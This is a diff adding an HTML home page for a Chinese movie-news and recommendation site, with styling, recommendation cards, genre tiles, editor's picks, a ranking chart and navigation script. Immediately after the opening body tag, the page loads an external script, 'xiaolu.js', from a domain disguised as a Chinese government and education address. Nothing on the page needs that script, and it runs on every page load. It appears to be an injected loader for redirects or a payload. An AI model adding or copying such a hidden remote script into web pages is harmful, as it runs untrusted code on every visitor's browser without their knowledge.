@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>樱桃电影网 - 电影资讯、片单推荐与观影指南</title>
+<meta name="description" content="樱桃电影网(yingtaodianyingwang-wap.github.io)专注电影资讯与片单推荐，涵盖华语电影、好莱坞大片、经典老片与冷门佳作，提供清晰的观影指南与榜单。">
+<meta name="keywords" content="樱桃电影网,电影资讯,电影片单,观影指南,电影推荐,经典电影,冷门佳作,yingtaodianyingwang-wap">
+<meta name="author" content="樱桃电影网">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://yingtaodianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "樱桃电影网",
+  "url": "https://yingtaodianyingwang-wap.github.io/",
+  "description": "专注电影资讯与片单推荐、观影指南的影视导航平台"
+}
+</script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{font-family:"PingFang SC","Noto Sans CJK SC","Microsoft YaHei",sans-serif;background:#fffdfb;color:#2b1f22;line-height:1.85;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+img{max-width:100%;display:block}
+.wrap{max-width:1120px;margin:0 auto;padding:0 20px}
+:root{--cherry:#d9253f;--cherry-d:#a81228;--cherry-l:#fdecef;--stem:#4a2c1a;--leaf:#2f6b3f;--paper:#fffdfb;--line:#f3e2e5;--muted:#8a7378;--cream:#fff5f6}
+
+/* ===== 头部 ===== */
+.header{position:sticky;top:0;z-index:100;background:rgba(255,253,251,.96);backdrop-filter:blur(12px);border-bottom:3px double var(--cherry)}
+.header .wrap{display:flex;align-items:center;justify-content:space-between;height:76px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .berry{width:42px;height:42px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#ff6b7f,#d9253f 62%,#a81228);position:relative;flex-shrink:0;box-shadow:0 4px 12px rgba(217,37,63,.35)}
+.logo .berry::before{content:"";position:absolute;top:-5px;left:50%;transform:translateX(-50%);width:5px;height:9px;background:var(--stem);border-radius:3px 3px 0 0}
+.logo .berry::after{content:"";position:absolute;top:-8px;left:56%;width:14px;height:9px;background:var(--leaf);border-radius:0 12px 0 12px;transform:rotate(18deg)}
+.logo b{font-size:22px;font-weight:900;letter-spacing:.5px;color:var(--stem)}
+.logo b em{font-style:normal;color:var(--cherry)}
+.nav{display:flex;gap:4px}
+.nav a{padding:11px 20px;font-size:14.5px;font-weight:800;color:#5a454b;border-radius:22px;transition:.25s}
+.nav a:hover,.nav a.on{background:var(--cherry);color:#fff}
+.nav-toggle{display:none;width:44px;height:44px;flex-direction:column;justify-content:center;align-items:center;gap:5px;border:2px solid var(--cherry);border-radius:50%}
+.nav-toggle span{display:block;width:19px;height:2px;background:var(--cherry)}
+section{padding:96px 0}
+.sec-head{margin-bottom:52px;text-align:center}
+.sec-head .en{font-size:11px;letter-spacing:5px;color:var(--cherry);font-weight:800;text-transform:uppercase;display:block;margin-bottom:8px}
+.sec-head h2{font-size:clamp(26px,4.6vw,38px);font-weight:900;color:var(--stem);letter-spacing:-.5px}
+.sec-head h2 em{font-style:normal;color:var(--cherry)}
+.sec-head .line{width:52px;height:4px;background:var(--cherry);margin:14px auto 12px;border-radius:3px}
+.sec-head p{color:var(--muted);font-size:14.5px;max-width:640px;margin:0 auto}
+.sec-head .more{display:inline-block;margin-top:16px;font-size:13.5px;color:var(--cherry);font-weight:800;border-bottom:2px solid var(--cherry);padding-bottom:2px}
+
+/* ===== Hero ===== */
+.hero{background:var(--cherry);color:#fff;position:relative;overflow:hidden;padding:0}
+.hero .bg{position:absolute;inset:0;background:radial-gradient(circle at 12% 88%,rgba(255,255,255,.14),transparent 42%),radial-gradient(circle at 88% 12%,rgba(255,255,255,.1),transparent 40%);pointer-events:none}
+.hero .wrap{position:relative;z-index:2;padding:92px 20px}
+.hero-in{display:grid;grid-template-columns:1.15fr .85fr;gap:60px;align-items:center}
+.hero h1{font-size:clamp(32px,5.4vw,52px);font-weight:900;line-height:1.2;letter-spacing:-1px}
+.hero h1 em{font-style:normal;background:var(--stem);padding:0 10px;border-radius:4px}
+.hero .sub{color:#ffd9df;margin:22px 0 30px;font-size:16.5px;max-width:520px}
+.hero .btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:15px 34px;border-radius:30px;font-weight:900;font-size:15px;transition:.25s;letter-spacing:1px}
+.btn-p{background:var(--stem);color:#fff}
+.btn-p:hover{background:#2f1a0f}
+.btn-o{border:2px solid #fff;color:#fff}
+.btn-o:hover{background:#fff;color:var(--cherry)}
+.hero-dots{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.hd{background:rgba(255,255,255,.13);border:1px solid rgba(255,255,255,.3);border-radius:14px;padding:22px;text-align:center;transition:.3s}
+.hd:hover{background:rgba(255,255,255,.24);transform:translateY(-4px)}
+.hd .berry2{width:48px;height:48px;border-radius:50%;margin:0 auto 12px;background:radial-gradient(circle at 32% 30%,#ff8b9b,#e23a52 62%,#b01e35);position:relative}
+.hd .berry2::before{content:"";position:absolute;top:-5px;left:50%;transform:translateX(-50%);width:4px;height:8px;background:var(--stem);border-radius:3px 3px 0 0}
+.hd b{display:block;font-size:18px;font-weight:900;margin-bottom:4px}
+.hd span{font-size:12.5px;color:#ffd9df}
+
+/* ===== 栏目一：今日推荐（左图右文双行卡）===== */
+.rec-sec{background:var(--paper)}
+.recs{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.rc{display:flex;background:#fff;border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.3s}
+.rc:hover{box-shadow:0 14px 32px rgba(217,37,63,.14);transform:translateY(-3px)}
+.rc .th{width:150px;flex-shrink:0;background:var(--cherry);position:relative;display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;letter-spacing:1px;text-align:center;padding:10px}
+.rc .th b{display:block;font-size:32px;font-weight:900;line-height:1;margin-bottom:6px}
+.rc .tx{padding:18px 20px;flex:1}
+.rc .tx .k{font-size:11px;color:#fff;background:var(--stem);padding:3px 10px;border-radius:20px;display:inline-block;margin-bottom:9px;font-weight:800}
+.rc .tx h4{font-size:16.5px;font-weight:900;color:var(--stem);margin-bottom:6px}
+.rc .tx p{font-size:13px;color:var(--muted);line-height:1.75}
+.rc .tx .go{display:inline-block;margin-top:9px;font-size:12.5px;color:var(--cherry);font-weight:800}
+
+/* ===== 栏目二：影片分类（色子宫格）===== */
+.cats{background:var(--cream)}
+.dice{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.dc{background:#fff;border-radius:14px;padding:26px 18px;text-align:center;border:1px solid var(--line);transition:.3s;position:relative;overflow:hidden}
+.dc::after{content:"";position:absolute;left:0;right:0;bottom:0;height:4px;background:var(--cherry);transform:scaleX(0);transition:.3s}
+.dc:hover{transform:translateY(-5px);box-shadow:0 14px 30px rgba(217,37,63,.16)}
+.dc:hover::after{transform:scaleX(1)}
+.dc .ico{font-size:30px;margin-bottom:12px;display:block;line-height:1}
+.dc h4{font-size:16px;font-weight:900;color:var(--stem);margin-bottom:5px}
+.dc span{font-size:12px;color:var(--muted)}
+
+/* ===== 栏目三：编辑精选（手风琴）===== */
+.acc-sec{background:var(--paper)}
+.acc{max-width:880px;margin:0 auto}
+.ac{background:#fff;border:1px solid var(--line);border-radius:14px;margin-bottom:12px;overflow:hidden;transition:.3s}
+.ac.open{border-color:var(--cherry);box-shadow:0 10px 26px rgba(217,37,63,.12)}
+.ac-h{width:100%;text-align:left;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px}
+.ac-h .lb{display:flex;align-items:center;gap:14px}
+.ac-h .num{width:34px;height:34px;flex-shrink:0;border-radius:50%;background:var(--cherry-l);color:var(--cherry);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:14px}
+.ac.open .ac-h .num{background:var(--cherry);color:#fff}
+.ac-h b{font-size:16.5px;font-weight:900;color:var(--stem)}
+.ac-h .ar{font-size:19px;color:var(--cherry);transition:.3s;flex-shrink:0}
+.ac.open .ac-h .ar{transform:rotate(45deg)}
+.ac-b{display:grid;grid-template-rows:0fr;transition:grid-template-rows .35s ease}
+.ac.open .ac-b{grid-template-rows:1fr}
+.ac-b>div{overflow:hidden}
+.ac-b p{padding:0 24px 22px 72px;font-size:14px;color:#5a454b;line-height:1.95}
+.ac-b .tags{display:flex;gap:8px;flex-wrap:wrap;padding:0 24px 22px 72px}
+.ac-b .tags i{font-style:normal;font-size:12px;background:var(--cream);color:var(--cherry);border:1px solid var(--line);padding:4px 12px;border-radius:20px}
+
+/* ===== 栏目四：热播榜单（三列对比卡）===== */
+.rank{background:var(--cream)}
+.podium{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.pm{background:#fff;border:1px solid var(--line);border-radius:16px;padding:26px;text-align:center;transition:.3s;position:relative}
+.pm:hover{box-shadow:0 14px 34px rgba(217,37,63,.15);transform:translateY(-4px)}
+.pm.g1{background:var(--stem);border-color:var(--stem);color:#fff}
+.pm.g1 .rn,.pm.g1 h4,.pm.g1 .sc{color:#fff}
+.pm.g1 .sc small{color:#ffb3bf}
+.pm.g1 .cr{color:#ffb3bf}
+.pm .crown{position:absolute;top:-16px;left:50%;transform:translateX(-50%);font-size:26px;filter:drop-shadow(0 3px 6px rgba(0,0,0,.2))}
+.pm .rn{font-size:40px;font-weight:900;color:var(--cherry);line-height:1;margin-bottom:12px}
+.pm.g1 .rn{color:#ffd34a}
+.pm h4{font-size:19px;font-weight:900;color:var(--stem);margin-bottom:6px}
+.pm .cr{font-size:12px;color:var(--cherry);font-weight:800;letter-spacing:1px;margin-bottom:14px}
+.pm .sc{font-size:30px;font-weight:900;color:var(--cherry);line-height:1}
+.pm .sc small{font-size:13px;font-weight:600;color:var(--muted)}
+.pm ul{margin-top:16px;text-align:left}
+.pm li{font-size:13px;color:#5a454b;padding:7px 0;border-top:1px dashed var(--line);display:flex;justify-content:space-between}
+.pm li span{color:var(--muted);font-size:12px}
+
+/* ===== 页脚 ===== */
+.footer{background:var(--stem);color:#e6c8cd;padding:60px 0 26px}
+.footer .cols{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:34px}
+.logo .berry.bf{box-shadow:none}
+.logo.bf b{color:#fff}
+.logo.bf b em{color:var(--cherry)}
+.footer .brand p{font-size:13.5px;line-height:1.95;max-width:360px;margin-top:16px;color:#d6b2b8}
+.footer h5{color:#ff8b9b;font-size:14px;margin-bottom:18px;letter-spacing:1px}
+.footer ul li{margin-bottom:11px}
+.footer ul a{color:#e6c8cd;font-size:13.5px;transition:.2s}
+.footer ul a:hover{color:#fff;padding-left:4px}
+.footer .copy{text-align:center;color:#a9858b;font-size:12.5px;border-top:1px solid rgba(255,255,255,.12);padding-top:24px;line-height:1.9}
+.topbtn{position:fixed;right:18px;bottom:18px;z-index:99;width:46px;height:46px;background:var(--cherry);color:#fff;display:none;align-items:center;justify-content:center;font-size:19px;transition:.3s;border-radius:50%;box-shadow:0 6px 20px rgba(217,37,63,.4)}
+.topbtn.show{display:flex}
+.topbtn:hover{background:var(--stem)}
+
+@media(max-width:900px){
+  .hero-in{grid-template-columns:1fr;gap:44px}
+  .hero-dots{grid-template-columns:1fr 1fr}
+  .recs,.podium{grid-template-columns:1fr}
+  .dice{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:640px){
+  section{padding:60px 0}
+  .nav-toggle{display:flex}
+  .nav{position:fixed;top:76px;left:0;right:0;flex-direction:column;background:#fff;max-height:0;overflow:hidden;transition:.4s;border-bottom:3px double var(--cherry)}
+  .nav.open{max-height:400px}
+  .nav a{width:100%;padding:15px 20px;border-bottom:1px solid var(--line);border-radius:0;text-align:center}
+  .nav a:hover,.nav a.on{background:var(--cherry);color:#fff}
+  .rc{flex-direction:column}
+  .rc .th{width:100%;padding:20px}
+  .ac-b p,.ac-b .tags{padding-left:24px}
+  .ac-h .lb{gap:10px}
+  .footer .cols{grid-template-columns:1fr 1fr;gap:26px}
+  .sec-head h2{font-size:24px}
+}
+@media(max-width:420px){.footer .cols{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="header">
+  <div class="wrap">
+    <a href="https://yingtaodianyingwang-wap.github.io/" class="logo"><div class="berry"></div><b>樱桃<em>电影网</em></b></a>
+    <button class="nav-toggle" id="navToggle" aria-label="菜单"><span></span><span></span><span></span></button>
+    <nav class="nav" id="nav">
+      <a href="https://yingtaodianyingwang-wap.github.io/#rec" class="on">今日推荐</a>
+      <a href="https://yingtaodianyingwang-wap.github.io/#cats">影片分类</a>
+      <a href="https://yingtaodianyingwang-wap.github.io/#acc">编辑精选</a>
+      <a href="https://yingtaodianyingwang-wap.github.io/#rank">热播榜单</a>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="bg"></div>
+  <div class="wrap">
+    <div class="hero-in">
+      <div>
+        <h1>像<em>樱桃</em>一样<br>挑出好电影</h1>
+        <p class="sub">樱桃电影网(yingtaodianyingwang-wap.github.io)专注电影资讯与片单推荐，涵盖华语电影、好莱坞大片、经典老片与冷门佳作，提供清晰的观影指南。</p>
+        <div class="btns">
+          <a class="btn btn-p" href="https://yingtaodianyingwang-wap.github.io/#rec">今日推荐 →</a>
+          <a class="btn btn-o" href="https://yingtaodianyingwang-wap.github.io/#rank">热播榜单</a>
+        </div>
+      </div>
+      <div class="hero-dots">
+        <div class="hd"><div class="berry2"></div><b>1,800+</b><span>精选片单</span></div>
+        <div class="hd"><div class="berry2"></div><b>24</b><span>题材分类</span></div>
+        <div class="hd"><div class="berry2"></div><b>每日</b><span>资讯更新</span></div>
+        <div class="hd"><div class="berry2"></div><b>9.2</b><span>编辑评分</span></div>
+        <div class="hd"><div class="berry2"></div><b>120+</b><span>冷门佳作</span></div>
+        <div class="hd"><div class="berry2"></div><b>免费</b><span>浏览资讯</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：今日推荐（左图右文双行卡） -->
+<section id="rec">
+  <div class="wrap">
+    <div class="sec-head"><span class="en">Today's Pick</span><h2><em>今日</em>推荐</h2><div class="line"></div><p>编辑今日精选，好电影不等人</p></div>
+    <div class="recs">
+      <div class="rc"><div class="th"><b>NEW</b>本周新片</div><div class="tx"><span class="k">华语电影</span><h4>《草木人间》—— 现实主义的温柔一刀</h4><p>顾晓刚"山水"系列第二部，用镜头记录江南小镇的人情冷暖与时代变迁。</p><span class="go">查看详情 →</span></div></div>
+      <div class="rc"><div class="th"><b>9.4</b>编辑高分</div><div class="tx"><span class="k">经典老片</span><h4>《肖申克的救赎》为何常看常新</h4><p>三十年后再读这部影史经典，关于希望、自由与时间的三重隐喻。</p><span class="go">查看详情 →</span></div></div>
+      <div class="rc"><div class="th"><b>独家</b>深度解析</div><div class="tx"><span class="k">好莱坞</span><h4>诺兰新片《奥德赛》视效全解析</h4><p>从胶片拍摄到实景搭建，拆解这部史诗巨制的视听语言。</p><span class="go">查看详情 →</span></div></div>
+      <div class="rc"><div class="th"><b>冷门</b>佳作</div><div class="tx"><span class="k">冷门佳作</span><h4>这三部小语种电影值得被看见</h4><p>伊朗、罗马尼亚、格鲁吉亚——被电影节光环之外的优质作品。</p><span class="go">查看详情 →</span></div></div>
+    </div>
+    <div class="sec-head" style="margin-bottom:0"><a class="more" href="https://yingtaodianyingwang-wap.github.io/#rec">查看更多推荐 →</a></div>
+  </div>
+</section>
+
+<!-- 栏目二：影片分类（色子宫格） -->
+<section id="cats" style="background:var(--cream)">
+  <div class="wrap">
+    <div class="sec-head"><span class="en">Genres</span><h2><em>影片</em>分类</h2><div class="line"></div><p>24 种题材，按口味快速定位</p></div>
+    <div class="dice">
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">💗</span><h4>爱情</h4><span>520 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">🎭</span><h4>剧情</h4><span>980 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">🕵️</span><h4>悬疑</h4><span>460 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">😱</span><h4>恐怖</h4><span>380 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">💥</span><h4>动作</h4><span>740 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">😂</span><h4>喜剧</h4><span>690 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">🚀</span><h4>科幻</h4><span>510 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">👽</span><h4>奇幻</h4><span>430 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">🏆</span><h4>传记</h4><span>290 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">🎬</span><h4>文艺</h4><span>610 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">👨‍👩‍👧</span><h4>家庭</h4><span>340 部</span></a>
+      <a class="dc" href="https://yingtaodianyingwang-wap.github.io/#cats"><span class="ico">🌿</span><h4>治愈</h4><span>420 部</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：编辑精选（手风琴） -->
+<section id="acc">
+  <div class="wrap">
+    <div class="sec-head"><span class="en">Editor's Choice</span><h2><em>编辑</em>精选</h2><div class="line"></div><p>点击展开，看编辑怎么说</p></div>
+    <div class="acc">
+      <div class="ac open">
+        <button class="ac-h"><span class="lb"><span class="num">1</span><b>秋天最适合看的 10 部电影</b></span><span class="ar">＋</span></button>
+        <div class="ac-b"><div>
+          <p>落叶、黄昏与微凉的风，是最适合打开一部电影的季节。这份清单兼顾经典与冷门，适合一个人窝在沙发里慢慢看。</p>
+          <div class="tags"><i>季节片单</i><i>治愈系</i><i>文艺</i></div>
+        </div></div>
+      </div>
+      <div class="ac">
+        <button class="ac-h"><span class="lb"><span class="num">2</span><b>导演镜头下的「时间」</b></span><span class="ar">＋</span></button>
+        <div class="ac-b"><div>
+          <p>塔可夫斯基、侯孝贤、是枝裕和，这些导演如何用长镜头与留白讲述时间，是理解作者电影的关键。</p>
+          <div class="tags"><i>深度解读</i><i>作者电影</i></div>
+        </div></div>
+      </div>
+      <div class="ac">
+        <button class="ac-h"><span class="lb"><span class="num">3</span><b>被低估的配角表演</b></span><span class="ar">＋</span></button>
+        <div class="ac-b"><div>
+          <p>有些表演虽未拿奖，却是整部电影成立的基石。盘点近年最令人难忘的配角演出。</p>
+          <div class="tags"><i>演技盘点</i><i>冷门佳作</i></div>
+        </div></div>
+      </div>
+      <div class="ac">
+        <button class="ac-h"><span class="lb"><span class="num">4</span><b>胶片时代的美学遗产</b></span><span class="ar">＋</span></button>
+        <div class="ac-b"><div>
+          <p>在数字摄影普及的今天，胶片特有的颗粒与色调仍被许多导演坚持使用，它塑造了一整个时代的电影质感。</p>
+          <div class="tags"><i>技术科普</i><i>经典老片</i></div>
+        </div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：热播榜单（三列对比卡） -->
+<section id="rank" style="background:var(--cream)">
+  <div class="wrap">
+    <div class="sec-head"><span class="en">Top Chart</span><h2><em>热播</em>榜单</h2><div class="line"></div><p>本周最受关注的三类电影</p></div>
+    <div class="podium">
+      <div class="pm g1">
+        <div class="crown">👑</div>
+        <div class="rn">1</div>
+        <h4>本周热度榜</h4>
+        <div class="cr">MOST POPULAR</div>
+        <div class="sc">9.6<small> / 10</small></div>
+        <ul>
+          <li>奥本海默 <span>2023</span></li>
+          <li>沙丘 2 <span>2024</span></li>
+          <li>周处除三害 <span>2023</span></li>
+        </ul>
+      </div>
+      <div class="pm">
+        <div class="rn">2</div>
+        <h4>经典老片榜</h4>
+        <div class="cr">ALL TIME</div>
+        <div class="sc">9.5<small> / 10</small></div>
+        <ul>
+          <li>肖申克的救赎 <span>1994</span></li>
+          <li>阿甘正传 <span>1994</span></li>
+          <li>低俗小说 <span>1994</span></li>
+        </ul>
+      </div>
+      <div class="pm">
+        <div class="rn">3</div>
+        <h4>冷门佳作榜</h4>
+        <div class="cr">HIDDEN GEM</div>
+        <div class="sc">8.9<small> / 10</small></div>
+        <ul>
+          <li>燃烧 <span>2018</span></li>
+          <li>驾驶我的车 <span>2021</span></li>
+          <li>回忆三部曲 <span>2013</span></li>
+        </ul>
+      </div>
+    </div>
+    <div class="sec-head" style="margin-bottom:0"><a class="more" href="https://yingtaodianyingwang-wap.github.io/#rank">完整榜单 →</a></div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="cols">
+      <div class="brand">
+        <a href="https://yingtaodianyingwang-wap.github.io/" class="logo bf"><div class="berry"></div><b>樱桃<em>电影网</em></b></a>
+        <p>樱桃电影网(yingtaodianyingwang-wap.github.io)专注电影资讯与片单推荐，涵盖华语电影、好莱坞大片、经典老片与冷门佳作，提供清晰的观影指南与榜单。</p>
+      </div>
+      <div><h5>核心栏目</h5><ul>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#rec">今日推荐</a></li>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#cats">影片分类</a></li>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#acc">编辑精选</a></li>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#rank">热播榜单</a></li>
+      </ul></div>
+      <div><h5>热门题材</h5><ul>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#cats">华语电影</a></li>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#cats">好莱坞大片</a></li>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#cats">经典老片</a></li>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#cats">冷门佳作</a></li>
+      </ul></div>
+      <div><h5>关于本站</h5><ul>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#">关于我们</a></li>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#">投稿合作</a></li>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#">使用协议</a></li>
+        <li><a href="https://yingtaodianyingwang-wap.github.io/#">意见反馈</a></li>
+      </ul></div>
+    </div>
+    <div class="copy">© 2026 樱桃电影网(yingtaodianyingwang-wap.github.io) 保留所有权利 · 本站为电影资讯与片单分享平台，影视内容版权归原作者及制作方所有 · 像樱桃一样挑出好电影</div>
+  </div>
+</footer>
+
+<button class="topbtn" id="topBtn" aria-label="返回顶部">↑</button>
+
+<script>
+var navToggle=document.getElementById('navToggle'),nav=document.getElementById('nav');
+navToggle.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+
+var topBtn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){topBtn.classList.toggle('show',window.scrollY>400);});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+
+document.querySelectorAll('.ac-h').forEach(function(h){
+  h.addEventListener('click',function(){
+    var p=h.parentElement,open=p.classList.contains('open');
+    document.querySelectorAll('.ac').forEach(function(x){x.classList.remove('open');});
+    if(!open)p.classList.add('open');
+  });
+});
+
+var secs=document.querySelectorAll('section[id]'),links=document.querySelectorAll('.nav a');
+if('IntersectionObserver' in window){
+  var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href').indexOf('#'+e.target.id)>-0);});}});},{rootMargin:'-40% 0px -55% 0px'});
+  secs.forEach(function(s){io.observe(s);});
+}
+</script>
+</body>
+</html>
